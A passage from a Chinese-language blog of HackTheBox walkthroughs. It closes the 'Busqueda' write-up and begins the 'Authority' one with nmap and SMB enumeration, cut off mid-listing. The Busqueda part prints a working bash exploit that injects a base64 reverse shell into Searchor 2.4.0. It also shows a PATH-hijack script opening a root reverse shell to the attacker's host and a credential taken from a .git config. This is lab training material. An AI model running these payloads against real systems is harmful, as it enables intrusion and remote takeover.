(Ubuntu)&#x27;.+ No CGI Directories found (use &#x27;-C all&#x27; to force check all possible dirs)+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS .+ 7962 requests: 0 error(s) and 4 item(s) reported on remote host+ End Time:           2023-07-18 22:52:12 (GMT-4) (667 seconds)---------------------------------------------------------------------------+ 1 host(s) tested\n\n没啥信息。\nweb渗透服务识别\n访问一下网站，看网站介绍说是用于选择社交媒体搜索引擎提高搜索效率啥的。但是管他呢，我们最想看的是网页最下面的那一行：Searchor 2.4.0。直接上谷歌搜索有无漏洞可以利用。\nSearchor我们一搜就发现github上有相关PoC。Searchor 2.4.0存在任意命令注入的漏洞。那我们就按PoC介绍利用一下。\n#PoC#!/bin/bash -default_port=&quot;9001&quot;port=&quot;$&#123;3:-$default_port&#125;&quot;rev_shell_b64=$(echo -ne &quot;bash  -c &#x27;bash -i &gt;&amp; /dev/tcp/$2/$&#123;port&#125; 0&gt;&amp;1&#x27;&quot; | base64)evil_cmd=&quot;&#x27;,__import__(&#x27;os&#x27;).system(&#x27;echo $&#123;rev_shell_b64&#125;|base64 -d|bash -i&#x27;)) # junky comment&quot;plus=&quot;+&quot;echo &quot;---[Reverse Shell Exploit for Searchor &lt;= 2.4.2 (2.4.0)]---&quot;if [ -z &quot;$&#123;evil_cmd##*$plus*&#125;&quot; ]then    evil_cmd=$(echo $&#123;evil_cmd&#125; | sed -r &#x27;s/[+]+/%2B/g&#x27;)fiif [ $# -ne 0 ]then    echo &quot;[*] Input target is $1&quot;    echo &quot;[*] Input attacker is $2:$&#123;port&#125;&quot;    echo &quot;[*] Run the Reverse Shell... Press Ctrl+C after successful connection&quot;    curl -s -X POST $1/search -d &quot;engine=Google&amp;query=$&#123;evil_cmd&#125;&quot; 1&gt; /dev/nullelse     echo &quot;[!] Please specify a IP address of target and IP address/Port of attacker for Reverse Shell, for example: ./exploit.sh &lt;TARGET&gt; &lt;ATTACKER&gt; &lt;PORT&gt; [9001 by default]&quot;fi\n\n$ ./searchor.sh http://searcher.htb/ &lt;HTB_VPN_IP&gt; &lt;LOCAL_PORT&gt;---[Reverse Shell Exploit for Searchor &lt;= 2.4.2 (2.4.0)]---[*] Input target is http://searcher.htb/[*] Input attacker is &lt;HTB_VPN_IP&gt;:&lt;LOCAL_PORT&gt;[*] Run the Reverse Shell... Press Ctrl+C after successful connection\n\n本地nc监听一下：\n$ sudo nc -lnvp 443listening on [any] 443 ...connect to [&lt;HTB_VPN_IP&gt;] from (UNKNOWN) [10.10.11.208] 35470bash: cannot set terminal process group (1659): Inappropriate ioctl for devicebash: no job control in this shellsvc@busqueda:/var/www/app$\n\n成功拿到立足点。在svc的home目录下可以发现user flag。\n提权虽然拿到shell第一时间是去home目录下看了下flag，但是我们刚进来的/var/www/app目录还没有好好看一眼。\nsvc@busqueda:/var/www/app$ ls -lals -latotal 20drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.pydrwxr-xr-x 8 www-data www-data 4096 Jul 19 03:03 .gitdrwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates\n\n我们发现有.git文件夹，那我们得进去看看。\nsvc@busqueda:/var/www/app/.git$ ls -lals -latotal 52drwxr-xr-x 8 www-data www-data 4096 Jul 19 03:03 .drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 branches-rw-r--r-- 1 www-data www-data   15 Dec  1  2022 COMMIT_EDITMSG-rw-r--r-- 1 www-data www-data  294 Dec  1  2022 config-rw-r--r-- 1 www-data www-data   73 Dec  1  2022 description-rw-r--r-- 1 www-data www-data   21 Dec  1  2022 HEADdrwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 hooks-rw-r--r-- 1 root     root      259 Apr  3 15:09 indexdrwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 infodrwxr-xr-x 3 www-data www-data 4096 Dec  1  2022 logsdrwxr-xr-x 9 www-data www-data 4096 Dec  1  2022 objectsdrwxr-xr-x 5 www-data www-data 4096 Dec  1  2022 refs\n\n这么多文件最需要看啥呢，当然是配置文件了，配置文件往往是最重要的那部分文件。\n直接进行一个查看。\nsvc@busqueda:/var/www/app/.git$ cat configcat config[core]        repositoryformatversion = 0        filemode = true        bare = false        logallrefupdates = true[remote &quot;origin&quot;]        url = http://cody:******************@gitea.searcher.htb/cody/Searcher_site.git        fetch = +refs/heads/*:refs/remotes/origin/*[branch &quot;main&quot;]        remote = origin        merge = refs/heads/main\n\n我们可以看到名为cody用户的github登录凭证。（不得不说他这密码看起还真像一串哈希值，我还想了一会会是什么哈希，结果之后试了一下是明文。。。。。。）\n我们当然希望登录凭证复用问题的出现，直接用这个登录凭证登录一下看看。发现登录并不成功，我们如果看看&#x2F;etc&#x2F;passwd的话也能发现其实并没有cody这个用户，那有没有可能是svc的密码呢？我们尝试一下发现果然是。\n$ ssh svc@10.10.11.208svc@10.10.11.208&#x27;s password:Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64) * Documentation:  https://help.ubuntu.com * Management:     https://landscape.canonical.com * Support:        https://ubuntu.com/advantage  System information as of Wed Jul 19 04:06:19 AM UTC 2023  System load:                      0.0185546875  Usage of /:                       80.9% of 8.26GB  Memory usage:                     59%  Swap usage:                       3%  Processes:                        238  Users logged in:                  0  IPv4 address for br-c954bf22b8b2: 172.20.0.1  IPv4 address for br-cbf2c5ce8e95: 172.19.0.1  IPv4 address for br-fba5a3e31476: 172.18.0.1  IPv4 address for docker0:         172.17.0.1  IPv4 address for eth0:            10.10.11.208 * Introducing Expanded Security Maintenance for Applications.   Receive updates to over 25,000 software packages with your   Ubuntu Pro subscription. Free for personal use.     https://ubuntu.com/proExpanded Security Maintenance for Applications is not enabled.0 updates can be applied immediately.Enable ESM Apps to receive additional future security updates.See https://ubuntu.com/esm or run: sudo pro statusThe list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Wed Jul 19 03:04:01 2023 from 10.10.14.24svc@busqueda:~$ \n\n那你可能想问这不是如蜜传如蜜吗，咋又回到svc这里了，提升了啥呢。当然不是原地tp，我们现在知道了svc 的密码，那就可以试试sudo -l了。如果没权限那确实原地tp了。\nsvc@busqueda:~$ sudo -l[sudo] password for svc:Matching Defaults entries for svc on busqueda:    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser svc may run the following commands on busqueda:    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *\n\n我们发现svc可以执行/usr/bin/python3 /opt/scripts/system-checkup.py *这么一条命令，我们先执行一下看看这是谁的部将。\nsvc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)     docker-ps     : List running docker containers     docker-inspect : Inpect a certain docker container     full-checkup  : Run a full system checkupsvc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-psCONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS             PORTS                                             NAMES960873171e2e   gitea/gitea:latest   &quot;/usr/bin/entrypoint…&quot;   6 months ago   Up About an hour   127.0.0.1:3000-&gt;3000/tcp, 127.0.0.1:222-&gt;22/tcp   giteaf84a6b33fb5a   mysql:8              &quot;docker-entrypoint.s…&quot;   6 months ago   Up About an hour   127.0.0.1:3306-&gt;3306/tcp, 33060/tcp               mysql_dbsvc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkupSomething went wrong\n\n我们大致试了一下action，暂时没啥好想法，先去它的路径下看一眼吧。\nsvc@busqueda:/opt/scripts$ ls -lals -latotal 28drwxr-xr-x 3 root root 4096 Dec 24  2022 .drwxr-xr-x 4 root root 4096 Mar  1 10:46 ..-rwx--x--x 1 root root  586 Dec 24  2022 check-ports.py-rwx--x--x 1 root root  857 Dec 24  2022 full-checkup.shdrwxr-x--- 8 root root 4096 Apr  3 15:04 .git-rwx--x--x 1 root root 3346 Dec 24  2022 install-flask.sh-rwx--x--x 1 root root 1903 Dec 24  2022 system-checkup.py\n\n在同一目录下我们还看到了full-checkup.sh,这和那个action的名字不是一样的吗，难道说system-checkup.py就是调用了它来实现action吗？那如果是的话我们不禁要问了，你这调用写的是相对路径还是绝对路径呢？我们当然希望其不是绝对路径，因为这样我们就能直接通过在PATH前面的位置插入我们伪造的full-checkup.sh提权脚本，或者是在某个目录下创建提权脚本并在该目录执行system-checkup.py。\n那么到底是不是呢？谁懂，试试就知道了。\nsvc@busqueda:~$ echo $PATH/home/svc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\n\n那我们直接在/home/svc/.local/bin下操作，不管你那种情况都能利用。\nsvc@busqueda:~/.local/bin$ vim full-checkup.shsvc@busqueda:~/.local/bin$ chmod +x full-checkup.shsvc@busqueda:~/.local/bin$ lltotal 24drwxrwxr-x 2 svc svc 4096 Jul 19 04:14 ./drwxrwxr-x 5 svc svc 4096 Jun 15  2022 ../-rwxrwxr-x 1 svc svc  208 Jun 15  2022 flask*-rwxrwxr-x 1 svc svc   60 Jul 19 04:14 full-checkup.sh*-rwxrwxr-x 1 svc svc  211 Jun 15  2022 pyjwt*svc@busqueda:~/.local/bin$ cat full-checkup.sh#!/bin/bash/bin/bash -i &gt;&amp; /dev/tcp/&lt;HTB_VPN_IP&gt;/8080 0&gt;&amp;1svc@busqueda:~/.local/bin$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup\n\n本地nc监听一下\n$ sudo nc -nlvp 8080listening on [any] 8080 ...connect to [&lt;HTB_VPN_IP&gt;] from (UNKNOWN) [10.10.11.208] 53532root@busqueda:/home/svc/.local/bin# cd /rootcd /rootroot@busqueda:~# ls -lals -latotal 60drwx------  9 root root 4096 Apr  3 16:01 .drwxr-xr-x 19 root root 4096 Mar  1 10:46 ..lrwxrwxrwx  1 root root    9 Feb 20 12:09 .bash_history -&gt; /dev/null-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrcdrwx------  3 root root 4096 Mar  1 10:46 .cachedrwx------  3 root root 4096 Mar  1 10:46 .config-rw-r-----  1 root root  430 Apr  3 15:13 ecosystem.config.js-rw-r--r--  1 root root  104 Apr  3 08:58 .gitconfigdrwxr-xr-x  3 root root 4096 Mar  1 10:46 .local-rw-------  1 root root   50 Feb 20 12:04 .my.cnflrwxrwxrwx  1 root root    9 Feb 20 12:12 .mysql_history -&gt; /dev/nulldrwxr-xr-x  4 root root 4096 Mar  1 10:46 .npmdrwxr-xr-x  5 root root 4096 Jul 19 03:03 .pm2-rw-r--r--  1 root root  161 Jul  9  2019 .profile-rw-r-----  1 root root   33 Jul 19 03:03 root.txtdrwxr-xr-x  4 root root 4096 Apr  3 16:01 scriptsdrwx------  3 root root 4096 Mar  1 10:46 snaproot@busqueda:~# cat root.txt\n\n 拿下，符合我们的预期。\n","categories":["HackTheBox"],"tags":["walkthrough"]},{"title":"[HTB]  Authority","url":"/2023/07/26/Authority/","content":"\n\n\n前言Windows靶机打得少，坐大牢。\n信息收集nmap$ sudo nmap -p- --min-rate=10000 10.10.11.222Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-25 02:49 EDTWarning: 10.10.11.222 giving up on port because retransmission cap hit (10).Nmap scan report for authority.htb (10.10.11.222)Host is up (0.078s latency).Not shown: 65472 closed tcp ports (reset), 34 filtered tcp ports (no-response)PORT      STATE SERVICE53/tcp    open  domain80/tcp    open  http88/tcp    open  kerberos-sec135/tcp   open  msrpc139/tcp   open  netbios-ssn389/tcp   open  ldap445/tcp   open  microsoft-ds464/tcp   open  kpasswd5593/tcp   open  http-rpc-epmap636/tcp   open  ldapssl3268/tcp  open  globalcatLDAP3269/tcp  open  globalcatLDAPssl5985/tcp  open  wsman8443/tcp  open  https-alt9389/tcp  open  adws47001/tcp open  winrm49664/tcp open  unknown49665/tcp open  unknown49666/tcp open  unknown49667/tcp open  unknown49672/tcp open  unknown49685/tcp open  unknown49686/tcp open  unknown49689/tcp open  unknown49690/tcp open  unknown49694/tcp open  unknown49702/tcp open  unknown49711/tcp open  unknown57114/tcp open  unknownNmap done: 1 IP address (1 host up) scanned in 14.38 seconds$ sudo nmap -sT -sV -sC -O -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,8443,9389,47001,49664,49665,49666,49667,49672,49685,49686,49689,49690,49694,49702,4971,57114 10.10.11.222Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-25 03:02 EDTNmap scan report for authority.htb (10.10.11.222)Host is up (0.076s latency).PORT      STATE SERVICE       VERSION53/tcp    open  domain        Simple DNS Plus80/tcp    open  http          Microsoft IIS httpd 10.0| http-methods:|_  Potentially risky methods: TRACE|_http-title: IIS Windows Server|_http-server-header: Microsoft-IIS/10.088/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-25 11:03:01Z)135/tcp   open  msrpc         Microsoft Windows RPC139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)| ssl-cert: Subject:| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB| Not valid before: 2022-08-09T23:03:21|_Not valid after:  2024-08-09T23:13:21|_ssl-date: 2023-07-25T11:04:17+00:00; +4h00m02s from scanner time.445/tcp   open  microsoft-ds?464/tcp   open  kpasswd5?593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)|_ssl-date: 2023-07-25T11:04:17+00:00; +4h00m02s from scanner time.| ssl-cert: Subject:| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB| Not valid before: 2022-08-09T23:03:21|_Not valid after:  2024-08-09T23:13:213268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)| ssl-cert: Subject:| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB| Not valid before: 2022-08-09T23:03:21|_Not valid after:  2024-08-09T23:13:21|_ssl-date: 2023-07-25T11:04:17+00:00; +4h00m02s from scanner time.3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)|_ssl-date: 2023-07-25T11:04:16+00:00; +4h00m01s from scanner time.| ssl-cert: Subject:| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB| Not valid before: 2022-08-09T23:03:21|_Not valid after:  2024-08-09T23:13:215985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.08443/tcp  open  ssl/https-alt| fingerprint-strings:|   FourOhFourRequest, GetRequest:|     HTTP/1.1 200|     Content-Type: text/html;charset=ISO-8859-1|     Content-Length: 82|     Date: Tue, 25 Jul 2023 11:03:07 GMT|     Connection: close|     &lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=&#x27;/pwm&#x27;&quot;/&gt;&lt;/head&gt;&lt;/html&gt;|   HTTPOptions:|     HTTP/1.1 200|     Allow: GET, HEAD, POST, OPTIONS|     Content-Length: 0|     Date: Tue, 25 Jul 2023 11:03:07 GMT|     Connection: close|   RTSPRequest:|     HTTP/1.1 400|     Content-Type: text/html;charset=utf-8|     Content-Language: en|     Content-Length: 1936|     Date: Tue, 25 Jul 2023 11:03:13 GMT|     Connection: close|     &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400|     Request&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body &#123;font-family:Tahoma,Arial,sans-serif;&#125; h1, h2, h3, b &#123;color:white;background-color:#525D76;&#125; h1 &#123;font-size:22px;&#125; h2 &#123;fnt-size:16px;&#125; h3 &#123;font-size:14px;&#125; p &#123;font-size:12px;&#125; a &#123;color:black;&#125; .line &#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 40|_    Request&lt;/h1&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid character found in the HTTP protocol [RTSP&amp;#47;1.00x0d0x0a0x0d0x0a...]/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invaid| ssl-cert: Subject: commonName=172.16.2.118| Not valid before: 2023-07-23T09:37:08|_Not valid after:  2025-07-24T21:15:32|_ssl-date: TLS randomness does not represent time|_http-title: Site doesn&#x27;t have a title (text/plain;charset=UTF-8).9389/tcp  open  mc-nmf        .NET Message Framing47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open  msrpc         Microsoft Windows RPC49665/tcp open  msrpc         Microsoft Windows RPC49666/tcp open  msrpc         Microsoft Windows RPC49667/tcp open  msrpc         Microsoft Windows RPC49672/tcp open  msrpc         Microsoft Windows RPC49685/tcp open  msrpc         Microsoft Windows RPC49686/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.049689/tcp open  msrpc         Microsoft Windows RPC49690/tcp open  msrpc         Microsoft Windows RPC49694/tcp open  msrpc         Microsoft Windows RPC49702/tcp open  msrpc         Microsoft Windows RPC49711/tcp open  msrpc         Microsoft Windows RPC57114/tcp open  msrpc         Microsoft Windows RPC1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-servie :SF-Port8443-TCP:V=7.94%T=SSL%I=7%D=7/25%Time=64BF73A9%P=x86_64-pc-linux-gnSF:u%r(GetRequest,DB,&quot;HTTP/1\\.1\\x20200\\x20\\r\\nContent-Type:\\x20text/html;cSF:harset=ISO-8859-1\\r\\nContent-Length:\\x2082\\r\\nDate:\\x20Tue,\\x2025\\x20JuSF:l\\x202023\\x2011:03:07\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\\n\\n\\n\\n\\n&lt;SF:html&gt;&lt;head&gt;&lt;meta\\x20http-equiv=\\&quot;refresh\\&quot;\\x20content=\\&quot;0;URL=&#x27;/pwm&#x27;\\&quot;/SF:&gt;&lt;/head&gt;&lt;/html&gt;&quot;)%r(HTTPOptions,7D,&quot;HTTP/1\\.1\\x20200\\x20\\r\\nAllow:\\x20GSF:ET,\\x20HEAD,\\x20POST,\\x20OPTIONS\\r\\nContent-Length:\\x200\\r\\nDate:\\x20TuSF:e,\\x2025\\x20Jul\\x202023\\x2011:03:07\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\SF:r\\n&quot;)%r(FourOhFourRequest,DB,&quot;HTTP/1\\.1\\x20200\\x20\\r\\nContent-Type:\\x20SF:text/html;charset=ISO-8859-1\\r\\nContent-Length:\\x2082\\r\\nDate:\\x20Tue,\\SF:x2025\\x20Jul\\x202023\\x2011:03:07\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\nSF:\\n\\n\\n\\n\\n&lt;html&gt;&lt;head&gt;&lt;meta\\x20http-equiv=\\&quot;refresh\\&quot;\\x20content=\\&quot;0;URSF:L=&#x27;/pwm&#x27;\\&quot;/&gt;&lt;/head&gt;&lt;/html&gt;&quot;)%r(RTSPRequest,82C,&quot;HTTP/1\\.1\\x20400\\x20\\r\\SF:nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent-Language:\\x20en\\r\\SF:nContent-Length:\\x201936\\r\\nDate:\\x20Tue,\\x2025\\x20Jul\\x202023\\x2011:03SF::13\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!doctype\\x20html&gt;&lt;html\\x20laSF:ng=\\&quot;en\\&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20SF:Request&lt;/title&gt;&lt;style\\x20type=\\&quot;text/css\\&quot;&gt;body\\x20&#123;font-family:Tahoma,SF:Arial,sans-serif;&#125;\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20&#123;color:white;backgroundSF:-color:#525D76;&#125;\\x20h1\\x20&#123;font-size:22px;&#125;\\x20h2\\x20&#123;font-size:16px;&#125;\\SF:x20h3\\x20&#123;font-size:14px;&#125;\\x20p\\x20&#123;font-size:12px;&#125;\\x20a\\x20&#123;color:blaSF:ck;&#125;\\x20\\.line\\x20&#123;height:1px;background-color:#525D76;border:none;&#125;&lt;/sSF:tyle&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP\\x20Status\\x20400\\x20\\xe2\\x80\\x93\\x20Bad\\x20RSF:equest&lt;/h1&gt;&lt;hr\\x20class=\\&quot;line\\&quot;\\x20/&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt;\\x20Exception\\x20ReSF:port&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt;\\x20Invalid\\x20character\\x20found\\x20in\\x20theSF:\\x20HTTP\\x20protocol\\x20\\[RTSP&amp;#47;1\\.00x0d0x0a0x0d0x0a\\.\\.\\.\\]&lt;/p&gt;&lt;p&gt;&lt;SF:b&gt;Description&lt;/b&gt;\\x20The\\x20server\\x20cannot\\x20or\\x20will\\x20not\\x20prSF:ocess\\x20the\\x20request\\x20due\\x20to\\x20something\\x20that\\x20is\\x20percSF:eived\\x20to\\x20be\\x20a\\x20client\\x20error\\x20\\(e\\.g\\.,\\x20malformed\\x20SF:request\\x20syntax,\\x20invalid\\x20&quot;);Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Wndows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%)No exact OS matches for host (test conditions non-ideal).Network Distance: 2 hopsService Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 4h00m01s, deviation: 0s, median: 4h00m01s| smb2-security-mode:|   3:1:1:|_    Message signing enabled and required| smb2-time:|   date: 2023-07-25T11:04:06|_  start_date: N/AOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 83.37 seconds$ sudo nmap --script=vuln 10.10.11.222Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-25 23:17 EDTPre-scan script results:| broadcast-avahi-dos:|   Discovered hosts:|     224.0.0.251|   After NULL UDP avahi packet DoS (CVE-2011-1002).|_  Hosts are all up (not vulnerable).Nmap scan report for authority.htb (10.10.11.222)Host is up (0.075s latency).Not shown: 987 closed tcp ports (reset)PORT     STATE SERVICE53/tcp   open  domain80/tcp   open  http|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.88/tcp   open  kerberos-sec135/tcp  open  msrpc139/tcp  open  netbios-ssn389/tcp  open  ldap445/tcp  open  microsoft-ds464/tcp  open  kpasswd5593/tcp  open  http-rpc-epmap636/tcp  open  ldapssl3268/tcp open  globalcatLDAP3269/tcp open  globalcatLDAPssl8443/tcp open  https-alt|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)| http-slowloris-check:|   VULNERABLE:|   Slowloris DOS attack|     State: LIKELY VULNERABLE|     IDs:  CVE:CVE-2007-6750|       Slowloris tries to keep many connections to the target web server open and hold|       them open as long as possible.  It accomplishes this by opening connections to|       the target web server and sending a partial request. By doing so, it starves|       the http server&#x27;s resources causing Denial Of Service.||     Disclosure date: 2009-09-17|     References:|       http://ha.ckers.org/slowloris/|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750| http-phpmyadmin-dir-traversal:|   VULNERABLE:|   phpMyAdmin grab_globals.lib.php subform Parameter Traversal Local File Inclusion|     State: UNKNOWN (unable to test)|     IDs:  CVE:CVE-2005-3299|       PHP file inclusion vulnerability in grab_globals.lib.php in phpMyAdmin 2.6.4 and 2.6.4-pl1 allows remote attackers to include local files via the $__redirect parameter, possibly involving the subform array.||     Disclosure date: 2005-10-nil|     Extra information:|       ../../../../../etc/passwd :||||||   &lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=&#x27;/pwm&#x27;&quot;/&gt;&lt;/head&gt;&lt;/html&gt;|     References:|       http://www.exploit-db.com/exploits/1244/|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3299| ssl-dh-params:|   VULNERABLE:|   Diffie-Hellman Key Exchange Insufficient Group Strength|     State: VULNERABLE|       Transport Layer Security (TLS) services that use Diffie-Hellman groups|       of insufficient strength, especially those using one of a few commonly|       shared groups, may be susceptible to passive eavesdropping attacks.|     Check results:|       WEAK DH GROUP 1|             Cipher Suite: TLS_DHE_RSA_WITH_AES_128_GCM_SHA256|             Modulus Type: Safe prime|             Modulus Source: RFC2409/Oakley Group 2|             Modulus Length: 1024|             Generator Length: 8|             Public Key Length: 1024|     References:|_      https://weakdh.org|_http-majordomo2-dir-traversal: ERROR: Script execution failed (use -d to debug)Host script results:|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR|_smb-vuln-ms10-054: falseNmap done: 1 IP address (1 host up) scanned in 314.65 seconds\n\n好好好，这么玩是吧，开29个端口是吧，咋不开290个端口。\n话是这么说，但是实际上后面RPC调用的端口，都不用看。前面梳理一下，根据经验来说，开了80肯定是要看一下的，139和445的smb共享服务也是要看一下的，还有就是8443有个https-alt的不知道是啥的https服务也是要看一下。其他的暂时不知道有没有用，反正我们先把熟悉的服务一一摸排一遍再说，不行再回看这些服务。\n其他扫描你问我这次为啥没有nikto？也没目录扫描？因为趁nmap扫的时候提前看了一眼80发现是IIS默认页面，没啥好扫的。\n服务渗透smb既然80是指定不行了，那就该轮到445了，我们先看看smb有没有什么目录是可以无密码访问的。\n$ smbclient -L 10.10.11.222Password for [WORKGROUP\\me]:        Sharename       Type      Comment        ---------       ----      -------        ADMIN$          Disk      Remote Admin        C$              Disk      Default share        Department Shares Disk        Development     Disk        IPC$            IPC       Remote IPC        NETLOGON        Disk      Logon server share        SYSVOL          Disk      Logon server shareReconnecting with SMB1 for workgroup listing.do_connect: Connection to 10.10.11.222 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Unable to connect with SMB1 -- no workgroup available\n\n我们直接用smbclient -L就能列出共享的目录，但是访问权限这些不清楚，所以我们还是要用smbmap扫一下。\n$ smbmap -H 10.10.11.222[+] IP: 10.10.11.222:445        Name: authority.htb\n\n没结果何意啊，明明smbclient都能扫出来，看了一下上面的结果，猜想可能是要提供一个用户名。\n$ smbmap -H 10.10.11.222 -u &quot;test&quot;[+] Guest session       IP: 10.10.11.222:445    Name: authority.htbDisk               Permissions     Comment---------------     -------ADMIN$              NO ACCESS       Remote AdminC$                  NO ACCESS       Default shareDepartment Shares   NO ACCESSDevelopment         READ ONLYIPC$                READ ONLY       Remote IPCNETLOGON            NO ACCESS       Logon server shareSYSVOL              NO ACCESS       Logon server share\n\n果然如此。我们可以发现，Development和IPC$都可以读，那我们就看看Development吧，因为一般IPC$里都不会有什么内容。我们直接无密码登录。\n$ smbclient //10.10.11.222/DevelopmentPassword for [WORKGROUP\\me]:Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; ls  .               D        0  Fri Mar 17 09:20:38 2023  ..              D        0  Fri Mar 17 09:20:38 2023  Automation      D        0  Fri Mar 17 09:20:40 20235888511 blocks of size 4096. 1215595 blocks availablesmb: \\&gt; cd Automation\\smb: \\Automation\\&gt; ls  .               D        0  Fri Mar 17 09:20:40 2023  ..              D        0  Fri Mar 17 09:20:40 2023  Ansible         D        0  Fri Mar 17 09:20:50 20235888511 blocks of size 4096. 1215595 blocks availablesmb: \\Automation\\&gt; cd Ansible\\smb: \\Automation\\Ansible\\&gt; ls  .               D        0  Fri Mar 17 09:20:50 2023  ..              D        0  Fri Mar 17 09:20:50 2023  ADCS            D        0  Fri Mar 17 09:20:48 2023  LDAP            D        0  Fri Mar 17 09:20:48 2023  PWM             D        0  Fri Mar 17 09:20:48 2023  SHARE           D        0  Fri Mar 17 09:20:48 20235888511 blocks of size 4096. 1215595 blocks 